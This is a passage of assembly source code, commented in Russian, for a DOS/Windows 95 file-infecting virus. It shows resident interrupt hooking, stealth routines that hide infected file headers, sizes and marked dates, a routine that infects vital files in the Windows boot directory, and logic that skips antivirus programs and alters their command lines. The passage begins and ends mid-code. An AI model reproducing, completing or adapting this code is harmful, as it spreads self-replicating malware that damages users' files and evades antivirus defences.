; READ stealth
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 readstealth:
        call    OpenSFT         ; открыть SFT
        cmp     cs:stf,0        ; работать можно?
        jnz     no_seek
        call    ioctl           ; проверка файла IOCTL
        jc      no_seek
        call    Inf_Check       ; инфицирован?
        jnc     no_seek

        call    SeekSave        ; сохранение позиции указателя
        call    int21           ; запрос чтения данных
        jc      seek_ret
        call    SaveRegs        ; сохранение регистров
        mov     di,dx           ; дублирование смещения буфера
        mov     cs:nrbytes,ax   ; количество прочитанных байт

        cmp     d cs:seek_pos,32 ; читают заголовок?
        jae     zone
        call    crload          ; прочитать настоящее начало файла

        lea     si,buffer       ; SI -> настоящее начало
        add     si,cs:seek_pos  ; SI -> с учетем смещения чтения

        mov     cx,cs:nrbytes   ; считаем количество байт которые нам нужно
        add     cx,cs:seek_pos  ; состелсить
        cmp     cx,32           ; позиция конца чтения лежит за пределом
        jbe     $+5             ; сохраненного начала файла?
        mov     cx,32
        sub     cx,cs:seek_pos

        jcxz    zone            ; в случае чтения 0 байт
 rhide: mov     al,cs:[si]      ; подмена инфицированного начала файла на
        mov     [di],al         ; оригинальное
        inc     si
        inc     di
        loop    rhide

 zone:  call    seekhide        ; блокируем возможность попадания lseek на
        call    LoadRegs        ; зону вируса + уменьшения числа прочитанных
        mov     ax,cs:nrbytes   ; байт
        jmp     seek_ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; ALL HANDLER stealth
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 patchsft:
        call    OpenSFT         ; открыть SFT
        jmp     no_seek

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; WRITE stealth
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 diswrite:
        call    OpenSFT         ; открыть SFT
        cmp     cs:stf,0        ; работать можно?
        jnz     no_seek
        call    ioctl           ; проверка файла IOCTL
        jc      no_seek
        call    Inf_Check       ; инфицирован?
        jnc     no_seek

        call    SaveRegs        ; сохранение регистров
        call    SeekSave        ; сохранение позиции указателя
        mvs     ds,cs           ; DS=CS

        call    crload          ; загрузка оригинального начала в буфер
        call    seek2bof        ; поместить указатель в начало файла
        mov     cx,32           ; запись оригинального заголовка файла
        lea     dx,buffer
        call    write
        xor     cx,ax           ; ошибка? ну тогда при записи того,
        jnz     disfail         ; чего просят ошибка будет тоже!

        mov     cx,-1           ; двигаемся к голове вируса. т.е.
        mov     dx,-vsize       ; к концу зараженной программы
        call    seekfrom_eof
        mov     ah,40h          ; обрезаем файл
        xor     cx,cx           ; удаляем тело вируса из вирусоносителя
        call    int21
        mov     ah,68h          ; сбрасываем буфера
        call    int21
 disfail:
        call    RestoreSeek     ; восстанавление позиции указателя
        call    LoadRegs        ; восстанавление регистров
        jmp     no_seek         ; выходим

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; проверка инфицированности памяти
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 tsrtest:
        mov     ax,3265h        ; Hi, AX=3265
        jmp     ireturn

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; повторный перехват вектора int 21h
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 rehook:
        call    SaveRegs        ; сохранение регистров
        call    chk_dup         ; проверка, был ли вектор уже
        jnz     no_hook         ; переустановлен
        call    WinOldAp        ; проверка, что-нибудь изменилось с
        cmp     ax,cs:w95state  ; момента инсталляции вируса в память
        jz      no_hook         ; (была ли загружена Win95)

        mov     ax,3521h        ; получение вектора int 21h
        int     21h
        mov     ax,2521h        ; установка нового вектора прерывания
        lea     dx,manager
        mvs     ds,cs
        int     21h
        call    set_dup         ; сохранение вектора в другой ячейке IVT
 no_hook:
        call    LoadRegs        ; восстановление регистров
        jmp     exithandler

; ════════════════════════> S·U·B·R·O·U·T·I·N·E·S <═════════════════════════
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; загрузка и перехват векторов прерываний
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 VectMan:
        call    SaveRegs        ; сохранение регистров

        mvs     ds,cs           ; инициализация сегментного регистра
        call    WinOldAp        ; получение статуса инсталляции WinOldAp
        mov     w95state,ax     ; сохранение флажка

        mov     ax,3521h        ; AH=35 AL=INT# - функция для получения
        int     21h             ; вектора прерывания AL
        mov     io21p,bx        ; сохранить вектор в ячейке памяти
        mov     io21p+2,es
        call    set_dup         ; установить 21-й вектор прерывания на другой
        mov     ax,2521h        ; установить свой обработчик
        lea     dx,handler      ; прерывания
        int     21h
        mov     ax,3508h        ; запрос вектора прерывания
        int     21h
        mov     io08,bx         ; сохранение вектора в ячейках памяти
        mov     io08+2,es
        mov     ax,2508h        ; установка прерывания 08h (таймер)
        lea     dx,vguard       ; для проверки целостности кода
        int     21h

        call    LoadRegs        ; восстановление векторов
        ret

 get_dup:
        push    ds si           ; загрузка регистров ES:BX оригинальным
        mvs     ds,0            ; вектором 21-го прерывания
        mov     si,63h*4
        mov     bx,[si]
        mov     es,[si+2]
        pop     si ds
        ret

 set_dup:
        push    ds si           ; сохранение ES:BX в 63-й векторе
        mvs     ds,0            ; прерывания
        mov     si,63h*4
        mov     [si],bx
        mov     [si+2],es
        pop     si ds
        ret

 chk_dup:
        push    ds si eax       ; проверка изменение 63-го вектора
        mvs     ds,0            ; прерывания
        mov     si,63h*4
        mov     eax,[si]
        cmp     d cs:io21p,eax
        pop     eax si ds
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; проверка активности Win95 (используя WinOldAp)
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 WinOldAp:
        mov     ax,1700h        ; функция WinOldAp Installation Check
        int     2fh             ; программа, которая присутствует в Win95
        ret                     ; в 32-разрядном режиме в PE формате

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; заражение некоторых жизненно важных файлов
; использует STACKS в качестве буфера для имен файлов
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 FixVirus:
        call    SaveRegs        ; сохранение регистров
        mov     si,2ch          ; по смещению 2C в PSP хранится сегмент
        mov     ds,cs:[si]      ; окружения
        xor     si,si           ; подготовка к сканированию окружения
        mvs     es,cs           ; ES:DI -> параметр окружения winbootdir
        lea     di,windows

 FxD:   call    compare         ; сравнение элеменита шаблона winbootdir
        jz      FxedI           ; с ячейкой окружения по DS:SI
        cmp     w [si],0        ; проверка на окончания блока глобальных
        jz      FxOUT           ; параметров
        inc     si              ; иначе увеличение индекса окружения
        jmp     FxD             ; искать дальше

 FxedI: lodsb                   ; здесь не только цикл, но еще сверху есть JZ
        xor     al,'='          ; поиск окончания имени переменной
        jnz     FxedI           ; '='

        mov     ah,60h          ; "TRUENAME" - CANONICALIZE FILENAME OR PATH
        lea     di,stacks       ; DS:SI - директория MD, ES:DI - наш буфер
        int     21h
        lea     di,stacks       ; DI - результат
        mvs     ds,cs           ; установка DS на сегмент вируса
        xor     al,al           ; поиск нуля в результата
        mov     cx,256          ; поиск в районе 256-ти байт
        cld
        repne   scasb
        jnz     FxOUT           ; выход в случае ошибки

        dec     di              ; DI указывает на ноль в директории
        cmp     b [di-1],'\'    ; проверка двойного \\
        jnz     $+3
        dec     di
        mov     bx,di           ; дублирование указателя
        lea     si,files        ; SI указывает на список файлов для инфекта

 FxVI:  cmp     b [si],0        ; больше нет жертв?
        jz      FxOUT           ; в этом случае выход
        mov     di,bx           ; копирование имени очерередной
        lodsb                   ; жертвы
        stosb
        or      al,al
        jnz     $-4

        mov     ax,1857h        ; вызов внутренней функции вируса
        lea     dx,stacks       ; для инфицирования файла по DS:DX
        int     21h
        jmp     FxVI            ; взять следующий файл

 FxOUT: call    LoadRegs        ; восстановление регистров
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Open/Close SFT - подпрограмма для закрытия/открытия нормальной SFT
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 OpenSFT:
        call    SaveRegs        ; сохранение регистров
        mov     si,0            ; "Open"
        jmp     Manipulate

 CloseSFT:
        call    SaveRegs        ; сохранение регистров
        mov     si,1            ; "Close"

 Manipulate:
        mov     bp,bx           ; сохранение handle
        call    ioctl           ; проверка, это файл или chardevice
        jc      SFT_Error

        mov     ax,1220h        ; получение JFT для этого файла
        int     2fh
        jc      SFT_Error
        xor     bx,bx
        mov     bl,es:[di]      ; BL = System file entry
        cmp     bl,0ffh
        je      SFT_Error
        mov     ax,1216h        ; получение адреса SFT в ES:DI
        int     2fh
        jc      SFT_Error

        mov     bx,bp           ; восстановление handle
        call    Inf_Check       ; проверка инфицированности файла
        jnc     SFT_Error       ; выход в случае чистого файла

        mov     eax,vsize
        cmp     si,0            ; "Open"?
        jz      open
        neg     eax
 open:  add     es:[di+11h],eax ; сохранение в SFT размера

        mov     dx,es:[di+0fh]  ; получение даты файла
        call    hidestm         ; скрытие лишних 100 лет
        cmp     si,0            ; "Open"?
        jnz     clsft
        ror     dh,1            ; увеличение даты файла
        add     dh,100
        rol     dh,1
 clsft: mov     es:[di+0fh],dx  ; сохранение измененной даты

 SFT_Error:
        call    LoadRegs        ; восстановление регистров
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; size stealth
; ES:SI -> Дата файла
; ES:DI -> Длина файла
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 sizst: mov     dx,es:[si]      ; dx = дата файла
        call    hidestm         ; маскировка и проверка 100 лишних лет
        jnc     oklen           ; файл инфицирован?
        mov     W es:[si],dx    ; установить нормальную дату файла
        sub     W es:[di],vsize ; маскировка приращения длины файла
        sbb     W es:[di+2],0
 oklen: ret

 hidestm:
        push    dx              ; сохранить дату в стеке
        shr     dh,1            ; получить год файла
        cmp     dh,100          ; сравнение его с 100
        pop     dx              ; восстановить дату
        jb      okinf
        ror     dh,1            ; получить год файла
        sub     dh,100          ; спрятать лишнее
        rol     dh,1            ;
        stc                     ; файл заражен!
        ret
 okinf: clc
        ret

 correctdate:
        mov     ax,5700h        ; установка даты файла в зависимости
        call    int21           ; от того, заражен ли он
        call    HideStm         ; нормальная дата
        call    Inf_Check       ; проверить файл на зараженность
        jnc     okdat
        ror     dh,1
        add     dh,100
        rol     dh,1
 okdat: mov     ax,5701h        ; установка откорректированной
        call    int21           ; даты файла
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Проверка имени файла (AVs)
; Проверка расширения файла (Extens)
; При SAVE_AX=4B00 добавление параметров в cmdline
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 Filename:
        call    SaveRegs        ; сохранение регистров
        cld

        mov     si,dx           ; смещение имени в индексный регистр
 nfind: lodsb                   ; поиск имени файла
        cmp     al,':'          ; в нашем случае оно будет следовать
        jz      separ           ; за последним "/", "\", ":"
        cmp     al,'\'
        jz      separ
        cmp     al,'/'
        jnz     store
 separ: mov     dx,si           ; сохранить смещение

 store: or      al,al           ; проверка конца строки (0)
        jnz     nfind

        mov     si,dx           ; SI -> имя файла
        xor     di,di           ; расширение пока не найдено
 gext:  lodsb
        cmp     al,'.'          ; расширение?
        jnz     $+4
        mov     di,si
        or      al,al
        jnz     gext
        or      di,di           ; если точек в имнеи файла
        jz      Bad_File        ; обнаружено не было

        lea     bp,[di-1]       ; сейчас BP-расширение файла, DX-его имя
        mvs     es,cs           ; ES=CS

        cmp     cs:save_ax,4b00h
        jne     no_add
        mov     si,dx           ; SI -> имя файла
        lea     di,prms         ; табличка (формат: avname,0,0,cmdline,0dh)

 scancmd:
        call    compare         ; сравнение имени запускаемой программы
        jz      addprm          ; с предусмотренным именем из таблицы
        mov     al,0dh
        mov     cx,0ffffh
        repne   scasb
        cmp     b cs:[di],0     ; конец таблицы?
        jnz     scancmd         ; в таблице имя не найдено - запущена
        jmp     no_add          ; другая программа

 addprm:
        push    es              ; сохранение ES
        mov     al,0
        mov     cx,0ffffh
        repne   scasb
        lea     si,[di+1]
        les     bx,d cs:save_bx ; загрузка в ES:BX адреса EPB
        les     bx,es:[bx+2]    ; загрузка адреса командной строки в ES:BX
        mov     di,bx
 getdx: inc     di              ; сканируем командную строку
        cmp     b es:[di],0dh   ; конец строки?
        jnz     getdx
        mov     cx,-1           ; счетчик длины дополнительного параметра
        lods    b cs:[si]       ; загрузка байта параметра
        stosb                   ; сохранение байта параметра
        inc     cx              ; увеличение счетчика
        cmp     al,0dh          ; проверка на окончание параметра
        jnz     $-6
        add     es:[bx],cl      ; увеличение длины командной строки
        pop     es              ; восстановление ES

 no_add:
        mov     si,bp
        lea     di,extens       ; ES:DI указывают на таблицу с
        call    compare         ; разрешенными расширениями
        jnz     Bad_File        ; некорректное расширение?

        mov     al,[si+1]       ; загрузка первого байта расширения
        call    upreg           ; перевод в верхний регистр
        mov     cs:host,al      ; установка флага

        mov     si,dx           ; SI -> имя файла
        lea     di,AVs          ; ES:DI -> таблица с именами
        call    compare         ; сравнение имен
        jz      Bad_File        ; неХоРошее имя

        call    LoadRegs        ; восстановление регистров
        clc                     ; очистка CF
        ret

 Bad_File:
        call    LoadRegs        ; восстановление регистров
        stc                     ; установка CF
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; установка байта STF в зависимости от текущего PSP/MCB
; байт равен 1 если текущий MCB принадлежит программе из STLOCK
; байт равен 0 если владелец текущего MB не зарегистрирован в STLOCK
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 mcbcheck:
        call    SaveRegs        ; сохранение регистров

        mov     ah,62h          ; запрос сегмента текущего PSP
        call    int21
        dec     bx              ; получение сегмента MCB
        mov     ds,bx           ; DS:SI указывают на владельца MB
        mov     si,08h          ;
        lea     di,stlock       ; ES:DI указывают на наш
        mvs     es,cs           ; список имен STLOCK
        call    compare         ; сравнение данных
        sete    cs:stf          ; установка стелс-флага

        call    LoadRegs        ; восстановление регистров
        ret                     ; выход из подпрограммы

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; COMPARE - сравнение данных
; DS:SI - источник
; ES:DI - таблица (Data1,0,Data2,0,...,DataN,0,0)
; Выход: ZF = 1 в случае совпадения данных
; Регистр латинских букв значения не имеет
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 compare:
        call    SaveRegs        ; сохранение регистров
        mov     dx,si           ; дублирование смещения источника

 data1: mov     si,dx           ; восстановление смещения источника
 data2: mov     al,ds:[si]      ; чтения байта источника
        mov     ah,es:[di]      ; чтения байта таблицы
        inc     di              ; увеличение индексных регистров
        inc     si              ;
        call    upreg           ; перевод символов в верхний регистр
        or      ah,ah           ; если в таблице образовался 0 =>
        jz      equal           ; => данные совпали
        cmp     al,ah           ; иначе побайтное сравнение
        jz      data2           ; если байты совпали, проверяем дальше

 data3: cmp     B es:[di],0     ; быйты не совпали, берем следующее
        jz      data4           ; поле
        inc     di
        jmp     data3

 data4: inc     di
        cmp     B es:[di],0     ; проверка на последнюю запись в
        jnz     data1           ; таблице

        call    LoadRegs        ; таблица кончилась: совпадений не найдено
        cmp     di,-1           ; очистка ZF
        ret                     ; выход из подпрограммы

 equal: call    LoadRegs        ; восстановление регистров
        cmp     al,al           ; установка ZF
        ret                     ; выход из подпрограммы

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Gets a random value [0..AX]
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 xrandom:
        push    bx cx dx si di
        mov     si,ax
        mov     ax,cs:random1
        mov     bx,cs:random2
        mov     cx,ax
        mov     di,8405h
        mul     di
        shl     cx,3
        add     ch,cl
        add     dx,cx
        add     dx,bx
        shl     bx,2
        add     dx,bx
        add     dh,bl
        shl     bx,5
        add     dh,bl
        add     ax,1
        adc     dx,0
        mov     cs:random1,ax
        mov     cs:random2,dx
        or      si,si
        jz      rnd_exit

        xor     dx,dx
        div     si
        xchg    ax,dx
 rnd_exit:
        pop     di si dx cx bx
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; подпрограммы для установки/снятия вектора прерывания
; критических ошибок int 24h
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 Hook24:
        call    SaveRegs        ; сохранение и перехват
        xor     ax,ax           ; вектора прерывания критических
        mov     ds,ax           ; ошибок int 24h
        mov     si,24h*4
        mov     dx,cs
        lea     ax,int24
        xchg    ax,[si]
        xchg    dx,[si+2]
        mov     cs:io24,ax
        mov     cs:io24+2,dx
        call    LoadRegs
        ret

 Remove24:
        call    SaveRegs        ; восстановление вектора int 24h
        xor     ax,ax
        mov     ds,ax
        mov     si,24h*4
        mov     ax,cs:io24
        mov     dx,cs:io24+2
        mov     [si],ax
        mov     [si+2],dx
        call    LoadRegs
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; подпрограммы для работы с файлами
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 RestoreFileAttributesA:
        push    ax bx cx dx ds
        mov     ax,7143h
        mov     cx,4301h
        mov     bx,1
        call    LFNAPI_Check
        mov     dx,cs:fn_ptr
        mov     ds,cs:fn_ptr+2
        mov     cx,cs:Attrib
        test    cl,1
        jz      noRFA
        call    int21
 noRFA: pop     ds dx cx bx ax
        ret

 ClearFileAttributesA:
        push    ax bx cx dx
        mov     ax,7143h
        xor     bx,bx
        mov     cx,4300h
        call    LFNAPI_Check
        call    int21
        jc      NoFA
        mov     cs:Attrib,cx
        mov     cs:fn_ptr,dx
        mov     cs:fn_ptr+2,ds
        test    cl,1
        jz      NoFA
        mov     ax,7143h
        mov     bx,1
        mov     cx,4301h
        call    LFNAPI_Check
        mov     cx,20h
        call    int21
        jc      NoFA
 NoFA:  pop     dx cx bx ax
        ret

 CreateFileA:
        push    ax cx dx si
        mov     ax,716ch
        mov     cx,6c00h
        call    LFNAPI_Check
        mov     bx,2
        xor     cx,cx
        mov     si,dx
        mov     dx,1
        call    int21
        xchg    ax,bx
        pop     si dx cx ax
        ret

 LFNAPI_Check:
        push    ax cx bx
        mov     ax,71a1h
        mov     bx,-1
        call    int21
        or      al,al
        jz      noLFNAPI
        pop     bx cx ax
        ret
 noLFNAPI:
        pop     bx ax cx
        ret

 GetDate:                       ; получение времени и даты
        mov     ax,5700h        ; последней записи в файл
        call    int21
        mov     cs:time,cx
        mov     cs:date,dx
        ret

 RestDate:                      ; восстановление времени и даты
        mov     ax,5701h        ; файла
        mov     cx,cs:time
        mov     dx,cs:date
        call    int21
        ret

 Write: mov     ah,40h          ; запись в файл
        call    int21
        ret

 Read:  mov     ah,3fh          ; чтение из файла
        call    int21
        ret

 CloseFile:
        mov     ah,3eh          ; закрытие файла
        call    int21
        ret

 SeekSave:
        call    SaveRegs        ; сохранение позиции
        xor     cx,cx           ; указателя (lseek) в файле
        xor     dx,dx
        call    seekfrom_cur
        mov     cs:seek_pos,ax
        mov     cs:seek_pos+2,dx
        call    LoadRegs
        ret

 RestoreSeek:
        call    SaveRegs        ; восстановление сохраненной
        mov     dx,cs:seek_pos  ; позиции указателя а файле
        mov     cx,cs:seek_pos+2
        call    seekfrom_bof
        call    LoadRegs
        ret

 seek2bof:
        mov     ax,4200h        ; установка указателя на
        xor     cx,cx           ; начало файла
        xor     dx,dx
        jmp     realseek

 seek2eof:
        mov     ax,4202h        ; установка указателя на
        xor     cx,cx           ; конец файла
        xor     dx,dx
        jmp     realseek

 seekfrom_eof:
        mov     ax,4202h        ; установка указателя
        jmp     realseek        ; от конца файла

 seekfrom_cur:
        mov     ax,4201h        ; установка указателя
        jmp     realseek        ; от текущей позиции

 seekfrom_bof:
        mov     ax,4200h        ; установка указателя
                                ; от начала файла
 realseek:
        call    int21
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; обработчик int 24h
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 int24: mov     al,3            ; Fail caller
        iret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; псевдо int 21h
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 int21: pushf                   ; занос в стек флагов и кодового
        push    cs              ; сегмента
        call    exithandler     ; управление вернется по адресу в стеке
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; проверка файла (дисковый?)
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 ioctl: push    ax dx           ; сохранение регистров
        mov     ax,4400h        ; IOCTL - GET DEVICE INFORMATION
        call    int21
